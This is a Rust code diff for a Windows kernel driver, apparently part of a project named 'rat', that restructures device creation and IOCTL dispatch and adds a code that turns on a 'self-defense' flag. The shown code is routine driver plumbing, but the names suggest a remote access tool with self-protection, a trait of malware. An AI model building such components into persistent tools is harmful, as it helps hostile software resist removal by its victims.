@@ -3,22 +3,49 @@ use core::{mem, ptr};
 
 use rat_common::windows::IOCTL_START_DEFENSE;
 use wdk::nt_success;
-use wdk_sys::ntddk::{IoCreateDevice, IoCreateSymbolicLink, RtlInitUnicodeString};
+use wdk_sys::ntddk::{
+    IoCreateDevice, IoCreateSymbolicLink, IofCompleteRequest, RtlInitUnicodeString,
+};
 use wdk_sys::{
     DEVICE_OBJECT, DO_BUFFERED_IO, DO_DEVICE_INITIALIZING, FILE_DEVICE_SECURE_OPEN,
-    FILE_DEVICE_UNKNOWN, IO_STACK_LOCATION, IRP, IRP_MJ_DEVICE_CONTROL, NTSTATUS, PDEVICE_OBJECT,
-    PDRIVER_OBJECT, PIRP, STATUS_UNSUCCESSFUL, UNICODE_STRING,
+    FILE_DEVICE_UNKNOWN, IO_NO_INCREMENT, IO_STACK_LOCATION, IRP, IRP_MJ_DEVICE_CONTROL, NTSTATUS,
+    PDEVICE_OBJECT, PDRIVER_OBJECT, PIRP, STATUS_INVALID_PARAMETER, STATUS_SUCCESS,
+    STATUS_UNSUCCESSFUL, UNICODE_STRING,
 };
 
-use crate::global::{DEVICE_NAME, DOS_NAME, SELF_DEFENSE_ACTIVATED};
-use crate::info;
+use crate::cleanup::cleanup_device;
+use crate::global::{DEVICE_NAME, DOS_NAME, RAT_DEVICE_OBJECT, SELF_DEFENSE_ACTIVATED};
 use crate::wrappers::bindings::IoGetCurrentIrpStackLocation;
+use crate::{error, info, warn};
 
 type IrpHandler = unsafe extern "C" fn(PDEVICE_OBJECT, PIRP) -> NTSTATUS;
 
 static _OLD_DEVICE_CONTROL_HANDLER: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
 
+struct _CleanupOnDrop {
+    pub device: PDEVICE_OBJECT,
+}
+
+impl Drop for _CleanupOnDrop {
+    fn drop(&mut self) {
+        cleanup_device(self.device);
+    }
+}
+
 pub fn create_device(driver: PDRIVER_OBJECT) -> anyhow::Result<PDEVICE_OBJECT> {
+    match unsafe { driver.as_mut() } {
+        Some(driver) => {
+            if let Some(handler) = driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] {
+                _OLD_DEVICE_CONTROL_HANDLER.store(handler as *mut u8, Ordering::Release);
+            }
+
+            driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] = Some(device_control_handler);
+        }
+        None => {
+            anyhow::bail!("A null pointer is provided to create_device");
+        }
+    }
+
     let mut dos_name = UNICODE_STRING::default();
     let mut device_name = UNICODE_STRING::default();
     unsafe {
@@ -41,22 +68,11 @@ pub fn create_device(driver: PDRIVER_OBJECT) -> anyhow::Result<PDEVICE_OBJECT> {
 
     anyhow::ensure!(nt_success(status), "IoCreateDevice error: 0x{status:X}");
 
+    let mut guard = _CleanupOnDrop { device };
+
     if let Some(device) = unsafe { device.as_mut() } {
         device.Flags |= DO_BUFFERED_IO;
         device.Flags &= !DO_DEVICE_INITIALIZING;
-    }
-
-    match unsafe { driver.as_mut() } {
-        Some(driver) => {
-            if let Some(handler) = driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] {
-                _OLD_DEVICE_CONTROL_HANDLER.store(handler as *mut u8, Ordering::Release);
-            }
-
-            driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] = Some(device_control_handler);
-        }
-        None => {
-            anyhow::bail!("A null pointer is provided to create_device");
-        }
     }
 
     let status = unsafe { IoCreateSymbolicLink(&mut dos_name, &mut device_name) };
@@ -65,37 +81,71 @@ pub fn create_device(driver: PDRIVER_OBJECT) -> anyhow::Result<PDEVICE_OBJECT> {
         "IoCreateSymbolicLink error: 0x{status:X}",
     );
 
+    guard.device = ptr::null_mut(); // Prevent cleanup on drop
     Ok(device)
 }
 
 unsafe extern "C" fn device_control_handler(device: PDEVICE_OBJECT, irp: PIRP) -> NTSTATUS {
-    // Handle our custom IOCTLs here. Stay as transparent as possible.
-    if let Some(device) = unsafe { device.as_ref() }
-        && let Some(irp) = unsafe { irp.as_mut() }
-        && let Some(irpsp) = unsafe { IoGetCurrentIrpStackLocation(irp).as_ref() }
-    {
-        device_control_notify(device, irp, irpsp);
-    }
+    let our_device = RAT_DEVICE_OBJECT.load(Ordering::Acquire);
+    if device == our_device {
+        let device = match unsafe { device.as_ref() } {
+            Some(d) => d,
+            None => {
+                warn!("irp_handler: PDEVICE_OBJECT is null");
+                return STATUS_INVALID_PARAMETER;
+            }
+        };
 
-    let old_handler = _OLD_DEVICE_CONTROL_HANDLER.load(Ordering::Acquire);
-    if old_handler.is_null() {
-        return STATUS_UNSUCCESSFUL;
-    }
+        let irp = match unsafe { irp.as_mut() } {
+            Some(i) => i,
+            None => {
+                warn!("irp_handler: PIRP is null");
+                return STATUS_INVALID_PARAMETER;
+            }
+        };
 
-    unsafe {
-        let handler = mem::transmute::<*mut u8, IrpHandler>(old_handler);
-        handler(device, irp)
+        let irpsp = match unsafe { IoGetCurrentIrpStackLocation(irp).as_mut() } {
+            Some(s) => s,
+            None => {
+                warn!("irp_handler: Failed to call IoGetCurrentIrpStackLocation");
+                return STATUS_INVALID_PARAMETER;
+            }
+        };
+
+        // Handle our custom IOCTLs here
+        let status = device_control_notify(device, irp, irpsp);
+        irp.IoStatus.__bindgen_anon_1.Status = status;
+        unsafe {
+            IofCompleteRequest(irp, IO_NO_INCREMENT as i8);
+        }
+        status
+    } else {
+        let old_handler = _OLD_DEVICE_CONTROL_HANDLER.load(Ordering::Acquire);
+        if old_handler.is_null() {
+            return STATUS_UNSUCCESSFUL;
+        }
+
+        unsafe {
+            let handler = mem::transmute::<*mut u8, IrpHandler>(old_handler);
+            handler(device, irp)
+        }
     }
 }
 
-fn device_control_notify(_: &DEVICE_OBJECT, _: &IRP, irpsp: &IO_STACK_LOCATION) {
+fn device_control_notify(
+    _: &DEVICE_OBJECT,
+    _: &mut IRP,
+    irpsp: &mut IO_STACK_LOCATION,
+) -> NTSTATUS {
     match unsafe { irpsp.Parameters.DeviceIoControl.IoControlCode } {
         IOCTL_START_DEFENSE => {
             info!("Activating self-defense");
             SELF_DEFENSE_ACTIVATED.store(true, Ordering::Release);
+            STATUS_SUCCESS
         }
-        _ => {
-            // pass
+        code => {
+            error!("Unknown IOCTL code: 0x{code:X}");
+            STATUS_INVALID_PARAMETER
         }
     }
 }
